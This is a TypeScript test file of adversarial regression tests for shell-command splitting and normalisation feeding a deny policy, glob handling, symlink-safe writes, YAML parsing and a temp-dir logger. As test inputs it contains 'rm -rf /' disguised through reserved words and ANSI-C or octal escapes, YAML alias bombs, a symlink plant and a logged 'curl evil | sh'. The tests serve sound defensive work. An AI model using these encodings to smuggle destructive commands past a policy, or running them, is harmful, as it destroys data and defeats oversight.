/**
 * Adversarial regression tests from the independent review of src/util/.
 * Each block names the defect it pins down (all reproduced against the pre-review code).
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import { splitCompoundCommand, normalizeCommand, shlexSplit } from '../../src/util/shlex.js';
import { walkGlob, globMatch, escapeGlob, type GlobDialect } from '../../src/util/glob.js';
import { writeFileAtomic, resolveWriteTarget, readJsonFile } from '../../src/util/fsx.js';
import { parseYaml, YamlError, YAML_MAX_DEPTH, YAML_MAX_ALIAS_NODES } from '../../src/util/yaml.js';
import { parseFrontMatter } from '../../src/util/frontmatter.js';
import { createLogger } from '../../src/util/log.js';
import { runShell, clampTimerMs } from '../../src/util/process.js';

const posix = { skip: process.platform === 'win32' ? 'POSIX only' : false };

/** Split, then normalize every segment (what the V3 shell policy matches against). */
function policyView(cmd: string): string[] | null {
  const segs = splitCompoundCommand(cmd);
  if (segs === null) return null;
  return segs.map((s) => normalizeCommand(s) ?? '<unparseable>');
}

// ───────────────────────────── shlex ─────────────────────────────

describe('review: splitCompoundCommand keeps escaped / quoted blanks intact', () => {
  it('an escaped space is not merged with the following blank run', () => {
    // Before: `echo a\  b` became `echo a\ b` (words [echo, "a b"] instead of [echo, "a ", b]).
    const segs = splitCompoundCommand('echo a\\  b');
    assert.deepEqual(segs, ['echo a\\  b']);
    assert.deepEqual(shlexSplit(segs![0]!), ['echo', 'a ', 'b']);
  });

  it('a trailing escaped space survives (no trim into a dangling backslash)', () => {
    // Before: trimmed to `echo a\`, which normalizeCommand rejected as unparseable.
    assert.deepEqual(splitCompoundCommand('echo a\\ '), ['echo a\\ ']);
    assert.equal(normalizeCommand(splitCompoundCommand('echo a\\ ')![0]!), 'echo a ');
    assert.deepEqual(splitCompoundCommand('echo a\\ ; ls'), ['echo a\\ ', 'ls']);
  });

  it('quoted trailing blanks and tabs are preserved; unquoted ones vanish', () => {
    assert.deepEqual(splitCompoundCommand("echo 'a ' b"), ["echo 'a ' b"]);
    assert.deepEqual(splitCompoundCommand('echo "a\t"\t\tb'), ['echo "a\t" b']);
    assert.deepEqual(splitCompoundCommand('  ls  -la   ;   pwd   '), ['ls -la', 'pwd']);
    assert.deepEqual(splitCompoundCommand('ls\t\t'), ['ls']);
  });

  it('a `#` after a collapsed blank still starts a comment', () => {
    assert.deepEqual(splitCompoundCommand('ls   # rm -rf /'), ['ls']);
    assert.deepEqual(splitCompoundCommand('ls a#b'), ['ls a#b']);
  });

  it('redirection operators still bind across the lazy blank', () => {
    assert.deepEqual(splitCompoundCommand('cmd  2>&1  |  grep x'), ['cmd 2>&1', 'grep x']);
    assert.deepEqual(splitCompoundCommand('cmd >| out'), ['cmd >| out']);
  });
});

describe('review: reserved words do not hide commands from policy', () => {
  const cases: Array<[string, string[]]> = [
    // Before: ['if true', 'then rm -rf /', 'fi'] — a `rm *` deny rule never saw `rm`.
    ['if true; then rm -rf /; fi', ['true', 'rm -rf /']],
    ['if true; then :; else rm -rf /; fi', ['true', ':', 'rm -rf /']],
    ['if a; then b; elif rm x; then c; fi', ['a', 'b', 'rm x', 'c']],
    ['while true; do rm -rf /; done', ['true', 'rm -rf /']],
    ['until false; do rm x; done', ['false', 'rm x']],
    ['for f in a b; do rm "$f"; done', ['for f in a b', 'rm "$f"']],
    ['! rm x', ['rm x']],
    ['if ! rm x; then :; fi', ['rm x', ':']],
    ['time rm x', ['rm x']],
    ['time -p rm x', ['rm x']],
    ['{ rm -rf /; }', ['rm -rf /']],
    ['if ! { rm x; }; then :; fi', ['rm x', ':']],
    ['function cleanup { rm -rf build; }; cleanup', ['rm -rf build', 'cleanup']],
    ['function cleanup() { rm -rf build; }', ['rm -rf build']],
    ['f() { rm -rf /; }; f', ['f', 'rm -rf /', 'f']],
    ['case $x in a) rm -rf /;; esac', ['case $x in a', 'rm -rf /']],
    // closing words with redirections stay visible
    ['while read l; do echo "$l"; done < in.txt', ['read l', 'echo "$l"', 'done < in.txt']],
    ['{ ls; } > /etc/passwd', ['ls', '} > /etc/passwd']],
    // quoted or glued words are not reserved
    ["'then' x", ["'then' x"]],
    ['thenx y', ['thenx y']],
    ['{rm x', ['{rm x']],
    ['echo then do done', ['echo then do done']],
  ];
  for (const [input, want] of cases) {
    it(JSON.stringify(input), () => assert.deepEqual(splitCompoundCommand(input), want));
  }
});

describe('review: normalizeCommand decodes bash quoting that shlex does not know', () => {
  const cases: Array<[string, string | null]> = [
    // Before: `$\x72\x6d -rf /` — an ANSI-C string dodged every `rm *` deny rule.
    ["$'\\x72\\x6d' -rf /", 'rm -rf /'],
    ["r$'\\155' -rf /", 'rm -rf /'], // octal, mid-word
    ["$'\\u0072'm x", 'rm x'],
    ["$'\\U0001F600'", '\u{1F600}'],
    ["$'it\\'s'", "it's"],
    ["$'a\\tb'", 'a\tb'],
    ["$'\\e[0m'", '\u001b[0m'],
    ["$'\\cA'", '\u0001'],
    ["$'\\c?'", '\u007f'],
    ["$'a\\0b'c", 'ac'], // NUL ends the ANSI-C value (bash)
    ["$'\\q'", '\\q'], // unknown escape keeps the backslash
    ["$'\\x'", '\\x'], // no hex digits
    ["$'\\xZZ'", '\\xZZ'],
    ["$''rm", 'rm'],
    ['$"rm" -rf /', 'rm -rf /'], // locale string == "…"
    [`"$'x'"`, "$'x'"], // inside double quotes `$'` is literal
    [`'$'"'"'x'`, "$'x"],
    ["$'abc", null], // unterminated
    ["$'abc\\", null],
    // unchanged shlex-compatible behaviour
    ['"a\\"b" \'c\'d', 'a"b cd'],
    ['"a\\qb"', 'a\\qb'],
    ['r\\m -rf /', 'rm -rf /'],
    ['a\\', null],
    ['"x', null],
    ['ls # not a comment here', 'ls # not a comment here'],
  ];
  for (const [input, want] of cases) {
    it(JSON.stringify(input), () => assert.equal(normalizeCommand(input), want));
  }

  it('end to end: split + normalize exposes the real command name', () => {
    assert.deepEqual(policyView("ls; $'\\x72m' -rf / && echo ok"), ['ls', 'rm -rf /', 'echo ok']);
    assert.deepEqual(policyView('if true; then "r"m -rf /; fi'), ['true', 'rm -rf /']);
  });

  it('shlexSplit itself stays Rust-shlex faithful (no ANSI-C decoding)', () => {
    assert.deepEqual(shlexSplit("$'\\x72'"), ['$\\x72']);
  });
});

// ───────────────────────────── glob ─────────────────────────────

describe('review: walkGlob treats the cwd and home directory as literal text', () => {
  let root: string;
  before(() => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'kc-review-glob-'));
    const mk = (rel: string): void => {
      const p = path.join(root, rel);
      fs.mkdirSync(path.dirname(p), { recursive: true });
      fs.writeFileSync(p, 'x');
    };
    mk('Projects [old]/repo/.kiro/steering/a.md');
    mk('Projects [old]/repo/README.md');
    mk('Projects o/repo/README.md'); // what `[old]` would match as a class
    mk('star*dir/x.md');
    mk('starXdir/y.md'); // what `*` would match as a wildcard
    mk('q?/z.md');
    mk('qq/w.md');
    mk('home [1]/.kiro/steering/g.md');
  });
  after(() => fs.rmSync(root, { recursive: true, force: true }));

  it('relative patterns under a cwd containing `[...]`', () => {
    // Before: [] — `[old]` was compiled as a character class, so steering never loaded.
    const cwd = path.join(root, 'Projects [old]', 'repo');
    assert.deepEqual(walkGlob('.kiro/steering/*.md', { cwd }), [path.join(cwd, '.kiro', 'steering', 'a.md')]);
    assert.deepEqual(walkGlob('*.md', { cwd }), [path.join(cwd, 'README.md')]);
    assert.deepEqual(walkGlob('**/*.md', { cwd }), [path.join(cwd, '.kiro', 'steering', 'a.md'), path.join(cwd, 'README.md')]);
  });

  it('a `*` or `?` in the cwd does not leak into sibling directories', () => {
    // Before: also returned starXdir/y.md.
    assert.deepEqual(walkGlob('*.md', { cwd: path.join(root, 'star*dir') }), [path.join(root, 'star*dir', 'x.md')]);
    assert.deepEqual(walkGlob('*.md', { cwd: path.join(root, 'q?') }), [path.join(root, 'q?', 'z.md')]);
  });

  it('`~` expands to a literal home directory', () => {
    const home = path.join(root, 'home [1]');
    assert.deepEqual(walkGlob('~/.kiro/steering/*.md', { cwd: '/', env: { HOME: home } }), [
      path.join(home, '.kiro', 'steering', 'g.md'),
    ]);
  });

  it('leading `..` climbs out of the literal base lexically', () => {
    const cwd = path.join(root, 'Projects [old]', 'repo');
    assert.deepEqual(walkGlob('../repo/*.md', { cwd }), [path.join(cwd, 'README.md')]);
    assert.deepEqual(walkGlob('./../repo/./*.md', { cwd }), [path.join(cwd, 'README.md')]);
  });

  it('literal relative patterns (no meta) under a bracketed cwd', () => {
    const cwd = path.join(root, 'Projects [old]', 'repo');
    assert.deepEqual(walkGlob('README.md', { cwd }), [path.join(cwd, 'README.md')]);
  });

  it('pattern text itself is still glob syntax', () => {
    assert.deepEqual(walkGlob('Projects [o]*/repo/README.md', { cwd: root }), [path.join(root, 'Projects o', 'repo', 'README.md')]);
    assert.deepEqual(walkGlob('Projects [[]old]/repo/README.md', { cwd: root }), [
      path.join(root, 'Projects [old]', 'repo', 'README.md'),
    ]);
  });

  it('absolute patterns: escapeGlob makes a bracketed prefix literal', posix, () => {
    const ws = path.join(root, 'Projects [old]', 'repo');
    assert.deepEqual(walkGlob(`${escapeGlob(ws)}/*.md`, { cwd: '/' }), [path.join(ws, 'README.md')]);
    // unescaped, the prefix is a pattern (glob-crate semantics, like Q): `[old]` is a class
    // and the walk lands in the decoy `Projects o/` directory instead.
    assert.deepEqual(walkGlob(`${ws}/*.md`, { cwd: '/' }), [path.join(root, 'Projects o', 'repo', 'README.md')]);
  });
});

describe('review: escapeGlob', () => {
  const nasty = ['a*b', 'a?b', '[x]', 'a]b', '{a,b}', 'a\\b', '!x', '-x', 'Projects [old]', '**', 'a/b*c/d', 'ü*😀'];
  const dialects: GlobDialect[] = ['path', 'globset', 'v3path'];
  for (const d of dialects) {
    it(`${d}: escaped text matches itself and nothing else`, () => {
      for (const s of nasty) {
        if (d !== 'globset' && s.includes('\\') && process.platform === 'win32') continue;
        const e = escapeGlob(s, d);
        assert.equal(globMatch(e, s, d), true, `${d} ${JSON.stringify(e)} vs ${JSON.stringify(s)}`);
        const other = s.replace(/[*?[\]{}]/g, 'Z');
        if (other !== s) assert.equal(globMatch(e, other, d), false, `${d} ${JSON.stringify(e)} vs ${JSON.stringify(other)}`);
      }
    });
  }
  it('escaped prefix + pattern', () => {
    assert.equal(globMatch(`${escapeGlob('/w [1]', 'v3path')}/**`, '/w [1]/a/b', 'v3path'), true);
    assert.equal(globMatch(`${escapeGlob('/w [1]', 'v3path')}/**`, '/w 1/a/b', 'v3path'), false);
    assert.equal(globMatch(`${escapeGlob('/w*', 'globset')}/*`, '/w*/a/b', 'globset'), true);
    assert.equal(globMatch(`${escapeGlob('/w*', 'globset')}/*`, '/wx/a', 'globset'), false);
  });
  it('wildcard dialect has no escapes: returned unchanged', () => {
    assert.equal(escapeGlob('git *', 'wildcard'), 'git *');
  });
});

// ───────────────────────────── fsx ─────────────────────────────

describe('review: writeFileAtomic writes through symlinks', posix, () => {
  let dir: string;
  before(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'kc-review-fsx-'));
  });
  after(() => fs.rmSync(dir, { recursive: true, force: true }));

  it('keeps a relative symlink and updates its target (dotfile-managed settings)', () => {
    // Before: the link was replaced by a regular file and the real file kept old content.
    fs.mkdirSync(path.join(dir, 'dotfiles'));
    fs.writeFileSync(path.join(dir, 'dotfiles', 'cli.json'), '{}');
    fs.chmodSync(path.join(dir, 'dotfiles', 'cli.json'), 0o600);
    fs.symlinkSync(path.join('dotfiles', 'cli.json'), path.join(dir, 'cli.json'));
    writeFileAtomic(path.join(dir, 'cli.json'), '{"a":1}\n');
    assert.equal(fs.lstatSync(path.join(dir, 'cli.json')).isSymbolicLink(), true);
    assert.deepEqual(readJsonFile(path.join(dir, 'cli.json')), { a: 1 });
    assert.equal(fs.statSync(path.join(dir, 'dotfiles', 'cli.json')).mode & 0o777, 0o600);
    assert.deepEqual(
      fs.readdirSync(path.join(dir, 'dotfiles')).filter((n) => n.endsWith('.tmp')),
      [],
    );
  });

  it('follows chains and creates the target of a dangling link', () => {
    fs.symlinkSync('chain2', path.join(dir, 'chain1'));
    fs.symlinkSync(path.join(dir, 'final.txt'), path.join(dir, 'chain2'));
    writeFileAtomic(path.join(dir, 'chain1'), 'hello');
    assert.equal(fs.readFileSync(path.join(dir, 'final.txt'), 'utf8'), 'hello');
    assert.equal(fs.lstatSync(path.join(dir, 'chain1')).isSymbolicLink(), true);
    assert.equal(fs.lstatSync(path.join(dir, 'chain2')).isSymbolicLink(), true);
  });

  it('resolveWriteTarget: plain paths, loops', () => {
    assert.equal(resolveWriteTarget(path.join(dir, 'nope', '..', 'x')), path.join(dir, 'x'));
    fs.symlinkSync('loopB', path.join(dir, 'loopA'));
    fs.symlinkSync('loopA', path.join(dir, 'loopB'));
    const t = resolveWriteTarget(path.join(dir, 'loopA'));
    assert.ok(t === path.join(dir, 'loopA') || t === path.join(dir, 'loopB'));
  });

  it('large multi-byte strings are written completely', () => {
    const big = 'ü😀x'.repeat(400_000);
    writeFileAtomic(path.join(dir, 'big.txt'), big);
    assert.equal(fs.readFileSync(path.join(dir, 'big.txt'), 'utf8'), big);
  });
});

// ───────────────────────────── yaml ─────────────────────────────

describe('review: parseYaml resists hostile documents', () => {
  it('alias expansion bomb is a YamlError, not an out-of-memory crash', () => {
    // Before: 8 levels of 10 aliases each exhausted the heap and killed the process.
    let s = 'a: &a [x,x,x,x,x,x,x,x,x,x]\n';
    let prev = 'a';
    for (let i = 0; i < 8; i++) {
      const n = `l${i}`;
      s += `${n}: &${n} [${Array(10).fill(`*${prev}`).join(',')}]\n`;
      prev = n;
    }
    const t0 = Date.now();
    assert.throws(() => parseYaml(s), (e: unknown) => e instanceof YamlError && /aliases expand/.test(e.message));
    assert.ok(Date.now() - t0 < 5000);
  });

  it('block-style alias bomb', () => {
    let s = 'a: &a\n  - x\n  - x\n  - x\n  - x\n  - x\n  - x\n  - x\n  - x\n  - x\n  - x\n';
    let prev = 'a';
    for (let i = 0; i < 8; i++) {
      const n = `l${i}`;
      s += `${n}: &${n}\n${Array(10).fill(`  - *${prev}`).join('\n')}\n`;
      prev = n;
    }
    assert.throws(() => parseYaml(s), YamlError);
  });

  it('deep flow and block nesting are YamlErrors, never RangeErrors', () => {
    assert.throws(() => parseYaml(`a: ${'['.repeat(50_000)}${']'.repeat(50_000)}`), YamlError);
    assert.throws(() => parseYaml(`a: ${'{b: '.repeat(5_000)}1${'}'.repeat(5_000)}`), YamlError);
    let block = '';
    for (let i = 0; i < 3000; i++) block += `${' '.repeat(i)}k:\n`;
    assert.throws(() => parseYaml(block), YamlError);
    let seq = '';
    for (let i = 0; i < 3000; i++) seq += `${' '.repeat(i * 2)}-\n`;
    assert.throws(() => parseYaml(seq), YamlError);
  });

  it('nesting below the limit still parses', () => {
    const depth = Math.floor(YAML_MAX_DEPTH / 2);
    const v = parseYaml(`a: ${'['.repeat(depth)}1${']'.repeat(depth)}`) as { a: unknown };
    let x: unknown = v.a;
    for (let i = 0; i < depth; i++) x = (x as unknown[])[0];
    assert.equal(x, 1);
  });

  it('ordinary aliases still work and each use is an independent copy', () => {
    const v = parseYaml('base: &b {x: 1, l: [1, 2]}\none: *b\ntwo: *b\ns: &s hello\nt: *s\nf: [*b, *s]') as Record<string, any>;
    assert.deepEqual(v.one, { x: 1, l: [1, 2] });
    assert.deepEqual(v.two, v.one);
    assert.notEqual(v.one, v.two);
    assert.notEqual(v.one, v.base);
    v.one.l.push(3);
    assert.deepEqual(v.base.l, [1, 2]);
    assert.deepEqual(v.two.l, [1, 2]);
    assert.equal(v.t, 'hello');
    assert.deepEqual(v.f, [{ x: 1, l: [1, 2] }, 'hello']);
  });

  it('a budget-sized but legitimate alias use passes', () => {
    const items = Array.from({ length: 1000 }, (_, i) => `k${i}`).join(', ');
    const v = parseYaml(`a: &a [${items}]\nb: *a\nc: *a`) as Record<string, unknown[]>;
    assert.equal(v.c!.length, 1000);
    assert.ok(YAML_MAX_ALIAS_NODES > 2002);
  });

  it('front matter with a bomb reports an error instead of crashing', () => {
    let s = '---\na: &a [x,x,x,x,x,x,x,x,x,x]\n';
    let prev = 'a';
    for (let i = 0; i < 8; i++) {
      s += `l${i}: &l${i} [${Array(10).fill(`*${prev}`).join(',')}]\n`;
      prev = `l${i}`;
    }
    s += '---\nbody\n';
    const fm = parseFrontMatter(s);
    assert.equal(fm.hasFrontMatter, true);
    assert.deepEqual(fm.data, {});
    assert.match(fm.error ?? '', /aliases expand/);
    assert.equal(fm.body, 'body\n');
  });
});

// ───────────────────────────── log ─────────────────────────────

describe('review: logger never follows planted symlinks in the shared temp dir', posix, () => {
  let root: string;
  before(() => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'kc-review-log-'));
  });
  after(() => fs.rmSync(root, { recursive: true, force: true }));

  it('a symlinked kiro-claude.log is not followed; the per-uid fallback is used', () => {
    // Before: log lines (attacker-influenced text) were appended to the link target.
    const base = path.join(root, 'a');
    const shared = path.join(base, 'kiro-log');
    fs.mkdirSync(shared, { recursive: true });
    fs.chmodSync(shared, 0o777);
    const victim = path.join(root, 'victim.rc');
    fs.writeFileSync(victim, 'orig\n');
    fs.symlinkSync(victim, path.join(shared, 'kiro-claude.log'));
    const lg = createLogger({ env: { TMPDIR: base }, level: 'info' });
    lg.info('hello\ncurl evil | sh');
    lg.close();
    assert.equal(fs.readFileSync(victim, 'utf8'), 'orig\n');
    assert.equal(fs.statSync(shared).mode & 0o777, 0o700, 'our own lax dir is tightened');
    const uid = String(process.getuid!());
    assert.equal(lg.file, path.join(base, `kiro-log-${uid}`, 'kiro-claude.log'));
    assert.match(fs.readFileSync(lg.file, 'utf8'), /INFO hello\n {2}curl evil \| sh\n$/);
  });

  it('a symlinked kiro-log directory is not used', () => {
    const base = path.join(root, 'b');
    const elsewhere = path.join(root, 'elsewhere');
    fs.mkdirSync(base, { recursive: true });
    fs.mkdirSync(elsewhere);
    fs.symlinkSync(elsewhere, path.join(base, 'kiro-log'));
    const lg = createLogger({ env: { TMPDIR: base }, level: 'info' });
    lg.info('x');
    lg.close();
    assert.deepEqual(fs.readdirSync(elsewhere), []);
    assert.ok(lg.file.includes(`kiro-log-${process.getuid!()}`));
  });

  it('normal default location still works and the file is 0600', () => {
    const base = path.join(root, 'c');
    fs.mkdirSync(base);
    const lg = createLogger({ env: { TMPDIR: base }, level: 'info' });
    lg.info('ok');
    lg.close();
    const f = path.join(base, 'kiro-log', 'kiro-claude.log');
    assert.equal(lg.file, f);
    assert.match(fs.readFileSync(f, 'utf8'), /INFO ok\n$/);
    assert.equal(fs.statSync(f).mode & 0o777, 0o600);
  });

  it('an explicit KIRO_CHAT_LOG_FILE is used as given (the user chose it)', () => {
    const real = path.join(root, 'real.log');
    fs.writeFileSync(real, '');
    const link = path.join(root, 'link.log');
    fs.symlinkSync(real, link);
    const lg = createLogger({ env: { KIRO_CHAT_LOG_FILE: link }, level: 'info' });
    lg.info('explicit');
    lg.close();
    assert.match(fs.readFileSync(real, 'utf8'), /INFO explicit\n$/);
  });

  it('an empty KIRO_CHAT_LOG_FILE counts as unset (default location, hardened)', () => {
    const base = path.join(root, 'd');
    fs.mkdirSync(base);
    const lg = createLogger({ env: { TMPDIR: base, KIRO_CHAT_LOG_FILE: '' }, level: 'info' });
    lg.info('x');
    lg.close();
    assert.equal(lg.file, path.join(base, 'kiro-log', 'kiro-claude.log'));
  });
});

// ───────────────────────────── process (regression only) ─────────────────────────────

describe('review: runShell stays bounded with huge stdin/stdout', () => {
  it('drains output beyond maxOutputBytes without deadlocking', async () => {
    const cmd = process.platform === 'win32' ? 'more' : 'cat';
    const r = await runShell(cmd, { cwd: os.tmpdir(), stdin: 'y'.repeat(3_000_000), maxOutputBytes: 1000, timeoutMs: 20_000 });
    assert.equal(r.timedOut, false);
    assert.equal(r.exitCode, 0);
    assert.equal(r.stdout.length, 1000);
    assert.deepEqual(r.truncated, { stdout: true, stderr: false });
  });
});

describe('review: runShell timer limits', () => {
  it('a timeout beyond the 32-bit timer range does not fire immediately', async () => {
    // Before: Node clamped 1e10 ms to 1 ms (printing TimeoutOverflowWarning on stderr) and
    // the command was SIGKILLed at once.
    const r = await runShell(process.platform === 'win32' ? 'echo done' : 'sleep 0.2; echo done', {
      cwd: os.tmpdir(),
      timeoutMs: 1e10,
      closeGraceMs: Infinity,
    });
    assert.equal(r.timedOut, false);
    assert.equal(r.stdout.trim(), 'done');
  });

  it('clampTimerMs', () => {
    assert.equal(clampTimerMs(1e10), 0x7fffffff);
    assert.equal(clampTimerMs(Infinity), 0x7fffffff);
    assert.equal(clampTimerMs(-5), 0);
    assert.equal(clampTimerMs(NaN), 0);
    assert.equal(clampTimerMs(1500), 1500);
  });
});
